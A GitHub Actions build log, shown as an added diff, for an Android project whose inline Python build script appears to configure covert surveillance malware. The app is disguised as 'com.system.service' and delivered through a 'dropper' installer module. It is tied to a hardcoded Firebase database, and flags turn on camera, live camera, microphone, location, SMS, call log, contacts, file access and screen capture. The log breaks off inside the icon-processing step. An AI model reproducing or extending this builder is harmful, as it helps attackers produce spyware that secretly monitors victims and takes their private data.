@@ -1,0 +1,674 @@
+﻿2026-10-27T08:04:02.3437240Z Current runner version: '2.338.0'
+2026-10-27T08:04:02.3458976Z ##[group]Runner Image Provisioner
+2026-10-27T08:04:02.3459809Z Hosted Compute Agent
+2026-10-27T08:04:02.3460362Z Version: 20261021.618
+2026-10-27T08:04:02.3460903Z Commit: 21505ad2541d5be6135ed84fc33697146cf75b8e
+2026-10-27T08:04:02.3461518Z Build Date: 2026-10-21T00:45:21Z
+2026-10-27T08:04:02.3462137Z Worker ID: {bcaafed7-d724-4f90-a50b-99f0f73973bb}
+2026-10-27T08:04:02.3462783Z Region: westus3
+2026-10-27T08:04:02.3463232Z Cloud: Azure
+2026-10-27T08:04:02.3463736Z ##[endgroup]
+2026-10-27T08:04:02.3464815Z ##[group]Operating System
+2026-10-27T08:04:02.3465428Z Ubuntu
+2026-10-27T08:04:02.3465896Z 24.04.5
+2026-10-27T08:04:02.3466312Z LTS
+2026-10-27T08:04:02.3466962Z ##[endgroup]
+2026-10-27T08:04:02.3467429Z ##[group]Runner Image
+2026-10-27T08:04:02.3467987Z Image: ubuntu-24.04
+2026-10-27T08:04:02.3468503Z Version: 20261012.334.1
+2026-10-27T08:04:02.3469624Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20261012.334/images/ubuntu/Ubuntu2404-Readme.md
+2026-10-27T08:04:02.3470958Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20261012.334
+2026-10-27T08:04:02.3471820Z ##[endgroup]
+2026-10-27T08:04:02.3472930Z ##[group]GITHUB_TOKEN Permissions
+2026-10-27T08:04:02.3474744Z Actions: read
+2026-10-27T08:04:02.3475270Z Contents: write
+2026-10-27T08:04:02.3475749Z Metadata: read
+2026-10-27T08:04:02.3476328Z ##[endgroup]
+2026-10-27T08:04:02.3478384Z Secret source: Actions
+2026-10-27T08:04:02.3479227Z Cache mode: write
+2026-10-27T08:04:02.3479811Z Prepare workflow directory
+2026-10-27T08:04:02.3751715Z Prepare all required actions
+2026-10-27T08:04:02.3792314Z Getting action download info
+2026-10-27T08:04:02.7292585Z Download action repository 'actions/checkout@v5' (SHA:fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09)
+2026-10-27T08:04:02.8622712Z Download action repository 'actions/setup-java@v5' (SHA:b6effb05e454b25005698d916606bdc6ffcbf961)
+2026-10-27T08:04:03.7943961Z Download action repository 'actions/upload-artifact@v4' (SHA:ea165f8d65b6e75b540449e92b4886f43607fa02)
+2026-10-27T08:04:04.0542812Z Complete job name: build
+2026-10-27T08:04:04.1289866Z ##[group]Run actions/checkout@v5
+2026-10-27T08:04:04.1290583Z with:
+2026-10-27T08:04:04.1290975Z   repository: ggvgghb243-hash/ando-projet
+2026-10-27T08:04:04.1294703Z   token: ***
+2026-10-27T08:04:04.1295057Z   ssh-strict: true
+2026-10-27T08:04:04.1295425Z   ssh-user: git
+2026-10-27T08:04:04.1295786Z   persist-credentials: true
+2026-10-27T08:04:04.1296233Z   clean: true
+2026-10-27T08:04:04.1296791Z   sparse-checkout-cone-mode: true
+2026-10-27T08:04:04.1297247Z   fetch-depth: 1
+2026-10-27T08:04:04.1297596Z   fetch-tags: false
+2026-10-27T08:04:04.1297960Z   show-progress: true
+2026-10-27T08:04:04.1298345Z   lfs: false
+2026-10-27T08:04:04.1298705Z   submodules: false
+2026-10-27T08:04:04.1299087Z   set-safe-directory: true
+2026-10-27T08:04:04.1299520Z   allow-unsafe-pr-checkout: false
+2026-10-27T08:04:04.1300134Z ##[endgroup]
+2026-10-27T08:04:04.3502122Z Syncing repository: ggvgghb243-hash/ando-projet
+2026-10-27T08:04:04.3504676Z ##[group]Getting Git version info
+2026-10-27T08:04:04.3505851Z Working directory is '/home/runner/work/ando-projet/ando-projet'
+2026-10-27T08:04:04.3507558Z [command]/usr/bin/git version
+2026-10-27T08:04:04.3540124Z git version 2.55.0
+2026-10-27T08:04:04.3557840Z ##[endgroup]
+2026-10-27T08:04:04.3571796Z Temporarily overriding HOME='/home/runner/work/_temp/5475edbf-c128-471d-bc9b-1a975820fbe2' before making global git config changes
+2026-10-27T08:04:04.3573926Z Adding repository directory to the temporary git global config as a safe directory
+2026-10-27T08:04:04.3576091Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/ando-projet/ando-projet
+2026-10-27T08:04:04.3629235Z Deleting the contents of '/home/runner/work/ando-projet/ando-projet'
+2026-10-27T08:04:04.3633114Z ##[group]Initializing the repository
+2026-10-27T08:04:04.3637132Z [command]/usr/bin/git init /home/runner/work/ando-projet/ando-projet
+2026-10-27T08:04:04.4068287Z hint: Using 'master' as the name for the initial branch. This default branch name
+2026-10-27T08:04:04.4069904Z hint: will change to "main" in Git 3.0. To configure the initial branch name
+2026-10-27T08:04:04.4071397Z hint: to use in all of your new repositories, which will suppress this warning,
+2026-10-27T08:04:04.4072495Z hint: call:
+2026-10-27T08:04:04.4073022Z hint:
+2026-10-27T08:04:04.4073712Z hint: 	git config --global init.defaultBranch <name>
+2026-10-27T08:04:04.4074616Z hint:
+2026-10-27T08:04:04.4075421Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+2026-10-27T08:04:04.4076991Z hint: 'development'. The just-created branch can be renamed via this command:
+2026-10-27T08:04:04.4078131Z hint:
+2026-10-27T08:04:04.4078664Z hint: 	git branch -m <name>
+2026-10-27T08:04:04.4079334Z hint:
+2026-10-27T08:04:04.4080217Z hint: Disable this message with "git config set advice.defaultBranchName false"
+2026-10-27T08:04:04.4081773Z Initialized empty Git repository in /home/runner/work/ando-projet/ando-projet/.git/
+2026-10-27T08:04:04.4084577Z [command]/usr/bin/git remote add origin https://github.com/ggvgghb243-hash/ando-projet
+2026-10-27T08:04:04.4141030Z ##[endgroup]
+2026-10-27T08:04:04.4147214Z ##[group]Disabling automatic garbage collection
+2026-10-27T08:04:04.4147894Z [command]/usr/bin/git config --local gc.auto 0
+2026-10-27T08:04:04.4181882Z ##[endgroup]
+2026-10-27T08:04:04.4182776Z ##[group]Setting up auth
+2026-10-27T08:04:04.4191326Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-10-27T08:04:04.4230189Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-10-27T08:04:04.4520857Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-10-27T08:04:04.4552944Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-10-27T08:04:04.4748327Z [command]/usr/bin/git config --local --name-only --get-regexp ^includeIf\.gitdir:
+2026-10-27T08:04:04.4781216Z [command]/usr/bin/git submodule foreach --recursive git config --local --show-origin --name-only --get-regexp remote.origin.url
+2026-10-27T08:04:04.4981634Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
+2026-10-27T08:04:04.5127056Z ##[endgroup]
+2026-10-27T08:04:04.5128146Z ##[group]Fetching the repository
+2026-10-27T08:04:04.5137884Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +cdb295b9a31f1c11728c56988c80bb6cf348205b:refs/remotes/origin/main
+2026-10-27T08:04:06.3366948Z From https://github.com/ggvgghb243-hash/ando-projet
+2026-10-27T08:04:06.3368546Z  * [new ref]         cdb295b9a31f1c11728c56988c80bb6cf348205b -> origin/main
+2026-10-27T08:04:06.3442667Z ##[endgroup]
+2026-10-27T08:04:06.3443538Z ##[group]Determining the checkout info
+2026-10-27T08:04:06.3444493Z ##[endgroup]
+2026-10-27T08:04:06.3445107Z [command]/usr/bin/git sparse-checkout disable
+2026-10-27T08:04:06.3465063Z [command]/usr/bin/git config --local --unset-all extensions.worktreeConfig
+2026-10-27T08:04:06.3495004Z ##[group]Checking out the ref
+2026-10-27T08:04:06.3498550Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
+2026-10-27T08:04:06.5390492Z Switched to a new branch 'main'
+2026-10-27T08:04:06.5393917Z branch 'main' set up to track 'origin/main'.
+2026-10-27T08:04:06.5419741Z ##[endgroup]
+2026-10-27T08:04:06.5850660Z [command]/usr/bin/git log -1 --format=%H
+2026-10-27T08:04:06.5876694Z cdb295b9a31f1c11728c56988c80bb6cf348205b
+2026-10-27T08:04:06.6137762Z ##[group]Run actions/setup-java@v5
+2026-10-27T08:04:06.6138040Z with:
+2026-10-27T08:04:06.6138204Z   java-version: 17
+2026-10-27T08:04:06.6138382Z   distribution: temurin
+2026-10-27T08:04:06.6138730Z   cache: gradle
+2026-10-27T08:04:06.6138908Z   java-package: jdk
+2026-10-27T08:04:06.6139082Z   check-latest: false
+2026-10-27T08:04:06.6139269Z   set-default: true
+2026-10-27T08:04:06.6139443Z   verify-signature: false
+2026-10-27T08:04:06.6139626Z   server-id: github
+2026-10-27T08:04:06.6139982Z   server-username: GITHUB_ACTOR
+2026-10-27T08:04:06.6140274Z   server-password: GITHUB_TOKEN
+2026-10-27T08:04:06.6140477Z   overwrite-settings: true
+2026-10-27T08:04:06.6140664Z   job-status: success
+2026-10-27T08:04:06.6142483Z   token: ***
+2026-10-27T08:04:06.6142695Z   show-download-progress: false
+2026-10-27T08:04:06.6142934Z ##[endgroup]
+2026-10-27T08:04:06.8236044Z ##[group]Installed distributions
+2026-10-27T08:04:06.9640506Z Resolved Java 17.0.20+1 from tool-cache
+2026-10-27T08:04:06.9640986Z Setting Java 17.0.20+1 as the default
+2026-10-27T08:04:06.9650494Z Creating toolchains.xml for JDK version 17 from temurin
+2026-10-27T08:04:06.9705536Z Writing to /home/runner/.m2/toolchains.xml
+2026-10-27T08:04:06.9705873Z 
+2026-10-27T08:04:06.9705999Z Java configuration:
+2026-10-27T08:04:06.9706281Z   Distribution: temurin
+2026-10-27T08:04:06.9706739Z   Version: 17.0.20+1
+2026-10-27T08:04:06.9707138Z   Path: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:06.9707509Z 
+2026-10-27T08:04:06.9707885Z ##[endgroup]
+2026-10-27T08:04:06.9748249Z Creating settings.xml with server-id: github
+2026-10-27T08:04:06.9748736Z Writing to /home/runner/.m2/settings.xml
+2026-10-27T08:04:06.9749572Z Configured MAVEN_ARGS to include -ntp to suppress Maven transfer progress logs. Set 'show-download-progress: true' to keep the download progress output.
+2026-10-27T08:04:07.4734592Z Cache hit for: setup-java-Linux-x64-gradle-19e7974b3a38e47a6dea55741378e3e29c42546de64210cce303af6b00193e94
+2026-10-27T08:04:08.7421787Z Received 33554432 of 333538397 (10.1%), 32.0 MBs/sec
+2026-10-27T08:04:09.7467812Z Received 176160768 of 333538397 (52.8%), 84.0 MBs/sec
+2026-10-27T08:04:10.7435865Z Received 329344093 of 333538397 (98.7%), 104.7 MBs/sec
+2026-10-27T08:04:10.7972381Z Received 333538397 of 333538397 (100.0%), 104.2 MBs/sec
+2026-10-27T08:04:10.7972718Z Cache Size: ~318 MB (333538397 B)
+2026-10-27T08:04:10.8006003Z [command]/usr/bin/tar -xf /home/runner/work/_temp/e0bf4e41-f872-4049-81c7-de0265d34617/cache.tzst -P -C /home/runner/work/ando-projet/ando-projet --use-compress-program unzstd
+2026-10-27T08:04:12.1142145Z Cache restored successfully
+2026-10-27T08:04:12.1273178Z Cache restored from key: setup-java-Linux-x64-gradle-19e7974b3a38e47a6dea55741378e3e29c42546de64210cce303af6b00193e94
+2026-10-27T08:04:12.4113882Z Cache hit for: setup-java-Linux-x64-gradle-wrapper-f03d42e3a9d13315d1a8acaf045916f3b603e553bec33200961198f47a3c6977
+2026-10-27T08:04:13.6112722Z Received 33554432 of 136233824 (24.6%), 32.0 MBs/sec
+2026-10-27T08:04:14.3680781Z Received 136233824 of 136233824 (100.0%), 73.9 MBs/sec
+2026-10-27T08:04:14.3681307Z Cache Size: ~130 MB (136233824 B)
+2026-10-27T08:04:14.3710553Z [command]/usr/bin/tar -xf /home/runner/work/_temp/8c4c58ad-bda8-4aeb-916a-038edf280c89/cache.tzst -P -C /home/runner/work/ando-projet/ando-projet --use-compress-program unzstd
+2026-10-27T08:04:14.5305036Z Cache restored successfully
+2026-10-27T08:04:14.5361249Z gradle-wrapper cache restored from key: setup-java-Linux-x64-gradle-wrapper-f03d42e3a9d13315d1a8acaf045916f3b603e553bec33200961198f47a3c6977
+2026-10-27T08:04:14.5855371Z ##[group]Run python -m pip install --break-system-packages pillow requests || python -m pip install pillow requests
+2026-10-27T08:04:14.5856184Z [36;1mpython -m pip install --break-system-packages pillow requests || python -m pip install pillow requests[0m
+2026-10-27T08:04:14.6309907Z shell: /usr/bin/bash -e {0}
+2026-10-27T08:04:14.6310165Z env:
+2026-10-27T08:04:14.6310450Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:14.6310863Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:14.6311175Z   MAVEN_ARGS: -ntp
+2026-10-27T08:04:14.6311585Z ##[endgroup]
+2026-10-27T08:04:15.0270848Z Defaulting to user installation because normal site-packages is not writeable
+2026-10-27T08:04:15.6101652Z Collecting pillow
+2026-10-27T08:04:15.6582382Z   Downloading pillow-13.0.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl.metadata (9.1 kB)
+2026-10-27T08:04:15.6618553Z Requirement already satisfied: requests in /usr/lib/python3/dist-packages (2.31.0)
+2026-10-27T08:04:15.6837072Z Downloading pillow-13.0.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)
+2026-10-27T08:04:15.8233278Z    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 7.1/7.1 MB 52.0 MB/s eta 0:00:00
+2026-10-27T08:04:16.0318248Z Installing collected packages: pillow
+2026-10-27T08:04:16.2940644Z Successfully installed pillow-13.0.0
+2026-10-27T08:04:16.3730142Z ##[group]Run chmod +x gradlew
+2026-10-27T08:04:16.3730403Z [36;1mchmod +x gradlew[0m
+2026-10-27T08:04:16.3785672Z shell: /usr/bin/bash -e {0}
+2026-10-27T08:04:16.3785892Z env:
+2026-10-27T08:04:16.3786156Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:16.3786709Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:16.3787033Z   MAVEN_ARGS: -ntp
+2026-10-27T08:04:16.3787223Z ##[endgroup]
+2026-10-27T08:04:16.3906295Z ##[group]Run python -c "$(cat <<'PYEOF'
+2026-10-27T08:04:16.3907205Z [36;1mpython -c "$(cat <<'PYEOF'[0m
+2026-10-27T08:04:16.3907481Z [36;1mimport os, re, base64, json, xml.sax.saxutils[0m
+2026-10-27T08:04:16.3907745Z [36;1mfrom PIL import Image[0m
+2026-10-27T08:04:16.3907945Z [36;1m[0m
+2026-10-27T08:04:16.3908237Z [36;1mapp_name = os.environ.get("APP_NAME", "Mobile Control").strip() or "Mobile Control"[0m
+2026-10-27T08:04:16.3908728Z [36;1mpackage_name = os.environ.get("PACKAGE_NAME", "com.system.service").strip() or "com.system.service"[0m
+2026-10-27T08:04:16.3909263Z [36;1mwebview_url = os.environ.get("WEBVIEW_URL", "https://google.com").strip() or "https://google.com"[0m
+2026-10-27T08:04:16.3909751Z [36;1muser_id = os.environ.get("USER_ID", "master01").strip() or "master01"[0m
+2026-10-27T08:04:16.3910093Z [36;1micon_b64 = os.environ.get("ICON_B64", "")[0m
+2026-10-27T08:04:16.3910409Z [36;1mfeature_flags_raw = os.environ.get("FEATURE_FLAGS_RAW", "{}")[0m
+2026-10-27T08:04:16.3910975Z [36;1mfirebase_url = "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/"[0m
+2026-10-27T08:04:16.3911414Z [36;1m[0m
+2026-10-27T08:04:16.3911578Z [36;1mtry:[0m
+2026-10-27T08:04:16.3911839Z [36;1m    features = json.loads(feature_flags_raw) if feature_flags_raw else {}[0m
+2026-10-27T08:04:16.3912154Z [36;1mexcept Exception as e:[0m
+2026-10-27T08:04:16.3912371Z [36;1m    features = {}[0m
+2026-10-27T08:04:16.3912561Z [36;1m[0m
+2026-10-27T08:04:16.3912732Z [36;1m# Safe Android XML escaping[0m
+2026-10-27T08:04:16.3913035Z [36;1msafe_app_name_attr = xml.sax.saxutils.quoteattr(app_name)[1:-1][0m
+2026-10-27T08:04:16.3913426Z [36;1msafe_app_name_xml = xml.sax.saxutils.escape(app_name).replace("'", "\\'")[0m
+2026-10-27T08:04:16.3913735Z [36;1m[0m
+2026-10-27T08:04:16.3913924Z [36;1m# 1. Update AndroidManifest.xml[0m
+2026-10-27T08:04:16.3914194Z [36;1mmanifest = "app/src/main/AndroidManifest.xml"[0m
+2026-10-27T08:04:16.3914567Z [36;1mif os.path.exists(manifest):[0m
+2026-10-27T08:04:16.3914865Z [36;1m    with open(manifest, "r", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3915133Z [36;1m        c = f.read()[0m
+2026-10-27T08:04:16.3915548Z [36;1m    c = re.sub(r"android:name=\"webview_url\" android:value=\"[^\"]*\"", f"android:name=\"webview_url\" android:value=\"{webview_url}\"", c)[0m
+2026-10-27T08:04:16.3916175Z [36;1m    c = re.sub(r"android:name=\"user_id\" android:value=\"[^\"]*\"", f"android:name=\"user_id\" android:value=\"{user_id}\"", c)[0m
+2026-10-27T08:04:16.3917051Z [36;1m    c = re.sub(r"android:name=\"firebase_url\" android:value=\"[^\"]*\"", f"android:name=\"firebase_url\" android:value=\"{firebase_url}\"", c)[0m
+2026-10-27T08:04:16.3917707Z [36;1m    c = re.sub(r"android:name=\"service_title\" android:value=\"[^\"]*\"", f"android:name=\"service_title\" android:value=\"{safe_app_name_attr}\"", c)[0m
+2026-10-27T08:04:16.3918321Z [36;1m[0m
+2026-10-27T08:04:16.3918523Z [36;1m    # Inject feature metadata flags[0m
+2026-10-27T08:04:16.3918765Z [36;1m    meta_injections = ""[0m
+2026-10-27T08:04:16.3918997Z [36;1m    for k, v in features.items():[0m
+2026-10-27T08:04:16.3919253Z [36;1m        val_str = "true" if v else "false"[0m
+2026-10-27T08:04:16.3919572Z [36;1m        c = re.sub(rf"<meta-data\s+android:name=\"feat_{k}\"[^>]*/>\n?", "", c)[0m
+2026-10-27T08:04:16.3920016Z [36;1m        meta_injections += f"        <meta-data android:name=\"feat_{k}\" android:value=\"{val_str}\" />\n"[0m
+2026-10-27T08:04:16.3920379Z [36;1m    if meta_injections:[0m
+2026-10-27T08:04:16.3920652Z [36;1m        app_tag_match = re.search(r"<application\b[^>]*>", c)[0m
+2026-10-27T08:04:16.3920933Z [36;1m        if app_tag_match:[0m
+2026-10-27T08:04:16.3921168Z [36;1m            end_pos = app_tag_match.end()[0m
+2026-10-27T08:04:16.3921463Z [36;1m            c = c[:end_pos] + "\n" + meta_injections + c[end_pos:][0m
+2026-10-27T08:04:16.3921730Z [36;1m[0m
+2026-10-27T08:04:16.3922165Z [36;1m    # Strip permissions from manifest if unchecked by user & sync foregroundServiceType[0m
+2026-10-27T08:04:16.3922564Z [36;1m    fgs_types = ["specialUse", "mediaProjection"][0m
+2026-10-27T08:04:16.3922923Z [36;1m    if features.get("camera") is not False or features.get("livecam") is not False:[0m
+2026-10-27T08:04:16.3923263Z [36;1m        fgs_types.append("camera")[0m
+2026-10-27T08:04:16.3923487Z [36;1m    else:[0m
+2026-10-27T08:04:16.3923818Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.CAMERA\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3924358Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_CAMERA\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3924750Z [36;1m[0m
+2026-10-27T08:04:16.3925021Z [36;1m    if features.get("audio") is not False or features.get("livecam") is not False:[0m
+2026-10-27T08:04:16.3925355Z [36;1m        fgs_types.append("microphone")[0m
+2026-10-27T08:04:16.3925596Z [36;1m    else:[0m
+2026-10-27T08:04:16.3925930Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.RECORD_AUDIO\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3926623Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_MICROPHONE\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3927135Z [36;1m[0m
+2026-10-27T08:04:16.3927332Z [36;1m    if features.get("location") is not False:[0m
+2026-10-27T08:04:16.3927601Z [36;1m        fgs_types.append("location")[0m
+2026-10-27T08:04:16.3927830Z [36;1m    else:[0m
+2026-10-27T08:04:16.3928176Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.ACCESS_FINE_LOCATION\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3928734Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.ACCESS_COARSE_LOCATION\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3929318Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_LOCATION\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3929724Z [36;1m[0m
+2026-10-27T08:04:16.3929905Z [36;1m    if features.get("sms") is False:[0m
+2026-10-27T08:04:16.3930273Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_SMS\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3930768Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.RECEIVE_SMS\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3931150Z [36;1m    if features.get("calls") is False:[0m
+2026-10-27T08:04:16.3931536Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_CALL_LOG\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3932039Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_CONTACTS\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3932684Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.CALL_PHONE\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3933133Z [36;1m    if features.get("gallery") is False and features.get("files") is False:[0m
+2026-10-27T08:04:16.3933608Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_EXTERNAL_STORAGE\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3934143Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_MEDIA_[^\"]*\"[^>]*/>", "", c)[0m
+2026-10-27T08:04:16.3934515Z [36;1m[0m
+2026-10-27T08:04:16.3934714Z [36;1m    # Update foregroundServiceType attribute[0m
+2026-10-27T08:04:16.3935154Z [36;1m    c = re.sub(r"android:foregroundServiceType=\"[^\"]*\"", f"android:foregroundServiceType=\"{'|'.join(fgs_types)}\"", c)[0m
+2026-10-27T08:04:16.3935550Z [36;1m[0m
+2026-10-27T08:04:16.3935755Z [36;1m    with open(manifest, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3936030Z [36;1m        f.write(c)[0m
+2026-10-27T08:04:16.3936231Z [36;1m[0m
+2026-10-27T08:04:16.3936415Z [36;1m# 2. Update strings.xml (Main App)[0m
+2026-10-27T08:04:16.3936883Z [36;1mstrings = "app/src/main/res/values/strings.xml"[0m
+2026-10-27T08:04:16.3937275Z [36;1mif os.path.exists(strings):[0m
+2026-10-27T08:04:16.3937544Z [36;1m    with open(strings, "r", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3937797Z [36;1m        c = f.read()[0m
+2026-10-27T08:04:16.3938170Z [36;1m    c = re.sub(r"<string name=\"app_name\">.*</string>", f"<string name=\"app_name\">{safe_app_name_xml}</string>", c)[0m
+2026-10-27T08:04:16.3938597Z [36;1m    with open(strings, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3938856Z [36;1m        f.write(c)[0m
+2026-10-27T08:04:16.3939040Z [36;1m[0m
+2026-10-27T08:04:16.3939225Z [36;1m# 3. Update strings.xml (Dropper App)[0m
+2026-10-27T08:04:16.3939539Z [36;1mdropper_strings = "dropper/src/main/res/values/strings.xml"[0m
+2026-10-27T08:04:16.3939920Z [36;1mos.makedirs(os.path.dirname(dropper_strings), exist_ok=True)[0m
+2026-10-27T08:04:16.3940290Z [36;1mwith open(dropper_strings, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3960345Z [36;1m    f.write(f"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <string name=\"app_name\">{safe_app_name_xml}</string>\n</resources>")[0m
+2026-10-27T08:04:16.3960841Z [36;1m[0m
+2026-10-27T08:04:16.3961098Z [36;1mdropper_manifest = "dropper/src/main/AndroidManifest.xml"[0m
+2026-10-27T08:04:16.3961449Z [36;1mif os.path.exists(dropper_manifest):[0m
+2026-10-27T08:04:16.3961753Z [36;1m    with open(dropper_manifest, "r", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3962033Z [36;1m        c = f.read()[0m
+2026-10-27T08:04:16.3962342Z [36;1m    c = re.sub(r"android:label=\"[^\"]*\"", "android:label=\"@string/app_name\"", c)[0m
+2026-10-27T08:04:16.3962704Z [36;1m    with open(dropper_manifest, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3962978Z [36;1m        f.write(c)[0m
+2026-10-27T08:04:16.3963180Z [36;1m[0m
+2026-10-27T08:04:16.3963380Z [36;1m# 4. Update package name in build.gradle.kts[0m
+2026-10-27T08:04:16.3963656Z [36;1mapp_gradle = "app/build.gradle.kts"[0m
+2026-10-27T08:04:16.3963903Z [36;1mif os.path.exists(app_gradle):[0m
+2026-10-27T08:04:16.3964174Z [36;1m    with open(app_gradle, "r", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3964431Z [36;1m        c = f.read()[0m
+2026-10-27T08:04:16.3964732Z [36;1m    c = re.sub(r"applicationId\s*=\s*\"[^\"]*\"", f"applicationId = \"{package_name}\"", c)[0m
+2026-10-27T08:04:16.3965100Z [36;1m    with open(app_gradle, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3965348Z [36;1m        f.write(c)[0m
+2026-10-27T08:04:16.3965540Z [36;1m[0m
+2026-10-27T08:04:16.3965737Z [36;1mdropper_gradle = "dropper/build.gradle.kts"[0m
+2026-10-27T08:04:16.3965999Z [36;1mif os.path.exists(dropper_gradle):[0m
+2026-10-27T08:04:16.3966293Z [36;1m    with open(dropper_gradle, "r", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3966905Z [36;1m        c = f.read()[0m
+2026-10-27T08:04:16.3967223Z [36;1m    c = re.sub(r"applicationId\s*=\s*\"[^\"]*\"", f"applicationId = \"{package_name}.installer\"", c)[0m
+2026-10-27T08:04:16.3967617Z [36;1m    with open(dropper_gradle, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3967873Z [36;1m        f.write(c)[0m
+2026-10-27T08:04:16.3968053Z [36;1m[0m
+2026-10-27T08:04:16.3968219Z [36;1m# 5. Update google-services.json[0m
+2026-10-27T08:04:16.3968456Z [36;1mgs = "app/google-services.json"[0m
+2026-10-27T08:04:16.3968682Z [36;1mif os.path.exists(gs):[0m
+2026-10-27T08:04:16.3968918Z [36;1m    with open(gs, "r", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3969166Z [36;1m        c = f.read()[0m
+2026-10-27T08:04:16.3969468Z [36;1m    c = re.sub(r"\"package_name\":\s*\"[^\"]*\"", f"\"package_name\": \"{package_name}\"", c)[0m
+2026-10-27T08:04:16.3969813Z [36;1m    with open(gs, "w", encoding="utf-8") as f:[0m
+2026-10-27T08:04:16.3970049Z [36;1m        f.write(c)[0m
+2026-10-27T08:04:16.3970240Z [36;1m[0m
+2026-10-27T08:04:16.3970436Z [36;1m# 6. Process Custom Icon PNG if provided[0m
+2026-10-27T08:04:16.3970692Z [36;1mif icon_b64 and len(icon_b64) > 10:[0m
+2026-10-27T08:04:16.3970915Z [36;1m    try:[0m
+2026-10-27T08:04:16.3971229Z [36;1m        icon_path = "temp_icon.png"[0m
+2026-10-27T08:04:16.3971484Z [36;1m        with open(icon_path, "wb") as f:[0m
+2026-10-27T08:04:16.3971772Z [36;1m            f.write(base64.b64decode(icon_b64))[0m
+2026-10-27T08:04:16.3972039Z [36;1m        img = Image.open(icon_path)[0m
+2026-10-27T08:04:16.3972370Z [36;1m        sizes = {"mdpi": 48, "hdpi": 72, "xhdpi": 96, "xxhdpi": 144, "xxxhdpi": 192}[0m
+2026-10-27T08:04:16.3972757Z [36;1m        for target_dir in ["app/src/main/res", "dropper/src/main/res"]:[0m
+2026-10-27T08:04:16.3973074Z [36;1m            for density, size in sizes.items():[0m
+2026-10-27T08:04:16.3973387Z [36;1m                out_dir = os.path.join(target_dir, f"mipmap-{density}")[0m
+2026-10-27T08:04:16.3973706Z [36;1m                os.makedirs(out_dir, exist_ok=True)[0m
+2026-10-27T08:04:16.3974065Z [36;1m                img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher.png"))[0m
